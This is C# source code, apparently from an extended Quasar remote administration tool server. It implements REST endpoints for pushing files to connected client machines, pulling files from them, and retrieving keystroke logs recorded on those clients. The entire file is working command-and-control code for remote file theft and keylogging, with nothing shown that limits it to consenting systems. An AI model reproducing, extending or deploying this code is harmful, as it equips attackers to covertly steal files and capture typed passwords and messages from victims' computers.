using Quasar.Common.Logger;
using Quasar.Common.Messages;
using Quasar.Server.Messages;
using Quasar.Server.Models;
using Quasar.Server.Networking;
using Quasar.Server.RestApiConstants;
using System.Collections.Generic;
using System;
using System.IO;
using System.Net;
using System.Text;
using System.Text.Json;

namespace Quasar.Server.RestApi
{
    public static partial class RestServer
    {
        private static readonly Dictionary<string, FileManagerHandler> clientFileManagerHandlers = new Dictionary<string, FileManagerHandler>();
        private static readonly Dictionary<string, KeyloggerHandler> clientKeyloggerHandlers = new Dictionary<string, KeyloggerHandler>();
        public static readonly string baseUploadsDir = Directory.GetCurrentDirectory() + "\\uploads";
        public static readonly string keystrokeLogsDir = baseUploadsDir + "\\logged_keystrokes";

        private const int READ_BUF_LEN = 64 * 1024;

        /// <summary>
        /// Creates a new FileManagerHandler for the client or gets the current one, if one exists already.
        /// </summary>
        /// <param name="clientId">The ID for the client used for the FileManagerHandler.</param>
        /// <returns>
        /// Returns a new FileManagerHandler for the client if there is none currently available, otherwise creates a new one.
        /// </returns>
        public static FileManagerHandler CreateNewOrGetExistingFileManagerHandler(string clientId)
        {
            if (clientFileManagerHandlers.ContainsKey(clientId))
            {
                return clientFileManagerHandlers[clientId];
            }
            Client client = mainForm.LookupClientById(clientId);
            if (client == null)
            {
                throw new Exception("Could not find connected client by ID " + clientId);
            }
            FileManagerHandler f = new FileManagerHandler(client, viaRestApi: true, subDirectory: clientId, baseUploadsDir: baseUploadsDir);
            f.FileTransferUpdated += FileTransferUpdatedNop;
            MessageHandler.Register(f);
            clientFileManagerHandlers[clientId] = f;
            return f;
        }

        /// <summary>
        /// Creates a new KeyloggerHandler for the client or gets the current one, if one exists already.
        /// </summary>
        /// <param name="clientId">The ID for the client used for the KeyloggerHandler.</param>
        /// <returns>
        /// Returns a new KeyloggerHandler for the client if there is none currently available, otherwise creates a new one.
        /// </returns>
        public static KeyloggerHandler CreateNewOrGetExistingKeyloggerHandler(string clientId)
        {
            if (clientKeyloggerHandlers.ContainsKey(clientId))
            {
                return clientKeyloggerHandlers[clientId];
            }
            Client client = mainForm.LookupClientById(clientId);
            if (client == null)
            {
                throw new Exception("Could not find connected client by ID " + clientId);
            }
            KeyloggerHandler k = new KeyloggerHandler(client, viaRestApi: true, subDirectory: clientId, baseUploadsDir: keystrokeLogsDir);
            MessageHandler.Register(k);
            clientKeyloggerHandlers[clientId] = k;
            return k;
        }

        private static void FileTransferUpdatedNop(object sender, FileTransfer transfer) {} 

        private static void HandleTransferEndpoint(HttpListenerRequest request, HttpListenerResponse response)
        {
            if (request.HttpMethod == "GET")
            {
                // Getting all file transfers from this server session
                Logger.Debug("Received file transfer information request for all transfers.");
                SendSuccessResponse(response, GetSerializedFileTransfers());
                Logger.Debug("Sent file transfer information for all transfers.");
            }
            else if (request.HttpMethod == "POST")
            {
                // Create a new file transfer
                try
                {
                    FileTransferApiRequest req = GetFileTransferRequestFromPost(request);
                    Logger.Debug(String.Format(
                        "Received new file transfer request for client ID: {0}, type: {1}. source path {2}, dest path {3}.",
                        req.ClientId,
                        req.TransferType,
                        req.SourcePath,
                        req.DestPath
                    ));

                    FileManagerHandler handler = CreateNewOrGetExistingFileManagerHandler(req.ClientId);
                    int transferId = -1;
                    if (req.TransferType == RestConstants.TRANSFER_TYPE_SERVER_TO_CLIENT)
                    {
                        transferId = handler.BeginUploadFile(req.SourcePath, req.DestPath);
                        if (transferId < 0)
                        {
                            throw new Exception("Failed to create transfer.");
                        }
                        Logger.Info(String.Format(
                            "Created new server-client transfer {0} for client ID: {1}, source path {2}, dest path {3}.",
                            transferId,
                            req.ClientId,
                            req.SourcePath,
                            req.DestPath
                        ));
                    }
                    else if (req.TransferType == RestConstants.TRANSFER_TYPE_CLIENT_TO_SERVER)
                    {
                        transferId = handler.BeginDownloadFile(req.SourcePath, req.DestPath);
                        Logger.Info(String.Format(
                            "Created new client-server transfer {0} for client ID: {1}, source path {2}, dest path {3}.",
                            transferId,
                            req.ClientId,
                            req.SourcePath,
                            req.DestPath
                        ));
                    }
                    else
                    {
                        throw new Exception("Invalid transfer type " + req.TransferType);
                    }
                    if (FileManagerHandler.TransferExists(transferId))
                    {
                        SendSuccessResponse(response, GetSerializedFileTransfer(transferId));
                        Logger.Debug("Sent file transfer information for transfer ID " + transferId);
                    }
                    else
                    {
                        throw new Exception(String.Format("Newly created file transfer with ID {0} was not registered.", transferId));
                    }  
                }
                catch (Exception ex)
                {
                    Logger.Error("HandleTransferEndpoint exception: " + ex.ToString());
                    SendResponse(response, HttpStatusCode.InternalServerError, ex.Message);
                }
            }
            else
            {
                Logger.Error(String.Format("HTTP method {0} not supported for file transfer endpoint.", request.HttpMethod));
                SendResponse(response, HttpStatusCode.MethodNotAllowed, "Unsupported HTTP method " + request.HttpMethod);
            }
        }

        private static void HandleSpecificTransferEndpoint(HttpListenerRequest request, HttpListenerResponse response, string path)
        {
            if (request.HttpMethod == "GET")
            {
                string transferIdStr = TrimBasePath(path, FILE_TRANSFER_ENDPOINT + "/");
                int transferId = 0;
                if (!Int32.TryParse(transferIdStr, out transferId))
                {
                    Logger.Error(String.Format("Received file transfer information request for invalid transfer ID " + transferIdStr));
                    SendResponse(response, HttpStatusCode.BadRequest, "Bad transfer ID " + transferIdStr);
                    return;
                }

                // Getting specific file transfer
                Logger.Debug("Received file transfer information request for transfer ID " + transferId);
                if (FileManagerHandler.TransferExists(transferId))
                {
                    SendSuccessResponse(response, GetSerializedFileTransfer(transferId));
                    Logger.Debug("Sent file transfer information for transfer ID " + transferId);
                }
                else
                {
                    Logger.Error(String.Format("File transfer with ID {0} does not exist. Sending 404.", transferId));
                    SendResponse(response, HttpStatusCode.NotFound, String.Format("Transfer ID {0} does not exist.", transferIdStr));
                }
            }
            else
            {
                Logger.Error(String.Format("HTTP method {0} not supported for specific file transfer endpoint.", request.HttpMethod));
                SendResponse(response, HttpStatusCode.MethodNotAllowed, "Unsupported HTTP method " + request.HttpMethod);
            }
        }

        private static void HandleEnumerateUploadedFiles(HttpListenerRequest request, HttpListenerResponse response)
        {
            if (request.HttpMethod == "GET")
            {
                // Listing all uploaded files and their associated transfer IDs
                Logger.Debug("Received uploaded file information request for all completed uploads.");
                SendSuccessResponse(response, GetSerializedEnumeratedFileUploads());
                Logger.Debug("Sent uploaded file information for all completed uploads.");
            }
            else
            {
                Logger.Error(String.Format("HTTP method {0} not supported for uploaded files endpoint.", request.HttpMethod));
                SendResponse(response, HttpStatusCode.MethodNotAllowed, "Unsupported HTTP method " + request.HttpMethod);
            }
        }

        private static void HandleGetUploadedFile(HttpListenerRequest request, HttpListenerResponse response, string path)
        {
            if (request.HttpMethod == "GET")
            {
                string transferIdStr = TrimBasePath(path, UPLOADED_FILES_ENDPOINT + "/");
                int transferId = 0;
                if (!Int32.TryParse(transferIdStr, out transferId))
                {
                    Logger.Error(String.Format("Received uploaded file request for invalid file transfer ID " + transferIdStr));
                    SendResponse(response, HttpStatusCode.BadRequest, "Bad transfer ID " + transferIdStr);
                    return;
                }

                // Getting specific file transfer
                Logger.Debug("Received uploaded file request for transfer ID " + transferId);
                string filepath = FileManagerHandler.GetUploadedFilePath(transferId);
                if (filepath.Length > 0)
                {
                    SendFileDataResponse(response, filepath);
                    Logger.Debug(String.Format("Sent uploaded file {0} for file transfer ID {1}", filepath, transferId));
                }
                else
                {
                    Logger.Error(String.Format("Could not find a completed file upload with transfer ID {0}. Sending 404.", transferId));
                    SendResponse(response, HttpStatusCode.NotFound, String.Format("Completed file upload with transfer ID {0} does not exist.", transferIdStr));
                }
            }
            else
            {
                Logger.Error(String.Format("HTTP method {0} not supported for uploaded files endpoint.", request.HttpMethod));
                SendResponse(response, HttpStatusCode.MethodNotAllowed, "Unsupported HTTP method " + request.HttpMethod);
            }
        }

        private static void HandleKeyloggerEndpoint(HttpListenerRequest request, HttpListenerResponse response)
        {
            if (request.HttpMethod == "POST")
            {
                // Create a new keylog upload task
                try
                {
                    KeystrokeLogUploadApiRequest req = GetKeylogUploadRequestFromPost(request);
                    Logger.Debug(String.Format("Received new keystroke logs upload request for client ID: {0}.", req.ClientId));

                    KeyloggerHandler handler = CreateNewOrGetExistingKeyloggerHandler(req.ClientId);
                    string taskId = handler.RetrieveLogs();
                    if (String.IsNullOrEmpty(taskId))
                    {
                        throw new Exception("Failed to create keystroke logs upload task.");
                    }
                    if (KeyloggerHandler.KeystrokeLogsUploadTaskExists(taskId))
                    {
                        SendSuccessResponse(response, GetSerializedKeylogUploadInfo(taskId));
                        Logger.Debug("Sent keystroke logs upload information for task ID " + taskId);
                    }
                    else
                    {
                        throw new Exception(String.Format("Newly created keystroke logs upload task with ID {0} was not registered.", taskId));
                    }
                }
                catch (Exception ex)
                {
                    Logger.Error("HandleKeyloggerEndpoint exception: " + ex.ToString());
                    SendResponse(response, HttpStatusCode.InternalServerError, ex.Message);
                }
            }
            else
            {
                Logger.Error(String.Format("HTTP method {0} not supported for keylogger endpoint.", request.HttpMethod));
                SendResponse(response, HttpStatusCode.MethodNotAllowed, "Unsupported HTTP method " + request.HttpMethod);
            }
        }

        private static void HandleSpecificKeyloggerUploadEndpoint(HttpListenerRequest request, HttpListenerResponse response, string path)
        {
            if (request.HttpMethod == "GET")
            {
                string taskId = TrimBasePath(path, KEYLOGGER_UPLOAD_ENDPOINT + "/");
                Logger.Debug("Received keystroke logs upload task info request for task ID " + taskId);
                if (KeyloggerHandler.KeystrokeLogsUploadTaskExists(taskId))
                {
                    try
                    {
                        SendSuccessResponse(response, GetSerializedKeylogUploadInfo(taskId));
                        Logger.Debug("Sent task information for keystroke logs upload task ID " + taskId);
                    }
                    catch (Exception ex)
                    {
                        Logger.Error(String.Format("Failed to fetch keystroke logs upload task info for task ID {0}: {1}", taskId, ex.ToString()));
                        SendResponse(
                            response, 
                            HttpStatusCode.InternalServerError, 
                            String.Format("Failed to fetch keystroke logs upload task info for task ID {0}: {1}", taskId, ex.Message)
                        );
                    }
                }
                else
                {
                    Logger.Error(String.Format("Keystroke logs upload task with ID {0} does not exist. Sending 404.", taskId));
                    SendResponse(response, HttpStatusCode.NotFound, String.Format("Keystroke logs upload task ID {0} does not exist.", taskId));
                }
            }
            else
            {
                Logger.Error(String.Format("HTTP method {0} not supported for specific keystroke logs upload task endpoint.", request.HttpMethod));
                SendResponse(response, HttpStatusCode.MethodNotAllowed, "Unsupported HTTP method " + request.HttpMethod);
            }
        }
        
        /// <summary>
        /// Generate byte representation of JSON dictionary containing uploaded file transfer IDs and file paths on the Quasar server.
        /// </summary>
        private static byte[] GetSerializedEnumeratedFileUploads()
        {
            string uploadsStr = JsonSerializer.Serialize(FileManagerHandler.GetUploadedFileListing());
            return Encoding.UTF8.GetBytes(uploadsStr);
        }

        /// <summary>
        /// Generate byte representation of JSON dictionary containing file transfer information
        /// </summary>
        private static byte[] GetSerializedFileTransfer(int transferId)
        {
            string transferStr = JsonSerializer.Serialize(FileManagerHandler.GetFileTransferRecordDict(transferId));
            return Encoding.UTF8.GetBytes(transferStr);
        }

        /// <summary>
        /// Generate byte representation of JSON list of dictionaries containing file transfer information
        /// </summary>
        private static byte[] GetSerializedFileTransfers()
        {
            string transfersStr = JsonSerializer.Serialize(FileManagerHandler.GetFileTransferRecordDictList());
            return Encoding.UTF8.GetBytes(transfersStr);
        }

        /// <summary>
        /// Generate byte representation of JSON dictionary containing keystroke logs upload information
        /// </summary>
        private static byte[] GetSerializedKeylogUploadInfo(string taskId)
        {
            string infoStr = JsonSerializer.Serialize(KeyloggerHandler.GetUploadInfoDict(taskId));
            return Encoding.UTF8.GetBytes(infoStr);
        }

        public static FileTransferApiRequest GetFileTransferRequestFromPost(HttpListenerRequest request)
        {
            Dictionary<string, JsonElement> dataDict = GetApiRequestPostData(request);
            FileTransferApiRequest ret = new FileTransferApiRequest();

            // Client ID
            if (!dataDict.ContainsKey(FileTransferApiRequest.CLIENT_ID_FIELD_NAME))
            {
                throw new JsonException(String.Format("File transfer POST request did not contain required key \"{0}\"", FileTransferApiRequest.CLIENT_ID_FIELD_NAME));
            }
            else
            {
                ret.ClientId = dataDict[FileTransferApiRequest.CLIENT_ID_FIELD_NAME].ToString();
            }

            // Transfer type
            if (!dataDict.ContainsKey(FileTransferApiRequest.TRANSFER_TYPE_FIELD_NAME))
            {
                throw new JsonException(String.Format("File transfer POST request did not contain required key \"{0}\"", FileTransferApiRequest.TRANSFER_TYPE_FIELD_NAME));
            }
            else
            {
                ret.TransferType = dataDict[FileTransferApiRequest.TRANSFER_TYPE_FIELD_NAME].GetInt32();
            }

            // Source path
            if (!dataDict.ContainsKey(FileTransferApiRequest.SOURCE_PATH_FIELD_NAME))
            {
                throw new JsonException(String.Format("File transfer POST request did not contain required key \"{0}\"", FileTransferApiRequest.SOURCE_PATH_FIELD_NAME));
            }
            else
            {
                ret.SourcePath = dataDict[FileTransferApiRequest.SOURCE_PATH_FIELD_NAME].ToString();
            }

            // Dest path
            if (!dataDict.ContainsKey(FileTransferApiRequest.DEST_PATH_FIELD_NAME))
            {
                ret.DestPath = "";
            }
            else
            {
                ret.DestPath = dataDict[FileTransferApiRequest.DEST_PATH_FIELD_NAME].ToString();
            }

            return ret;
        }

        public static KeystrokeLogUploadApiRequest GetKeylogUploadRequestFromPost(HttpListenerRequest request)
        {
            Dictionary<string, JsonElement> dataDict = GetApiRequestPostData(request);
            KeystrokeLogUploadApiRequest ret = new KeystrokeLogUploadApiRequest();

            // Client ID
            if (!dataDict.ContainsKey(KeystrokeLogUploadApiRequest.CLIENT_ID_FIELD_NAME))
            {
                throw new JsonException(String.Format("File transfer POST request did not contain required key \"{0}\"", KeystrokeLogUploadApiRequest.CLIENT_ID_FIELD_NAME));
            }
            else
            {
                ret.ClientId = dataDict[KeystrokeLogUploadApiRequest.CLIENT_ID_FIELD_NAME].ToString();
            }

            return ret;
        }
    }
}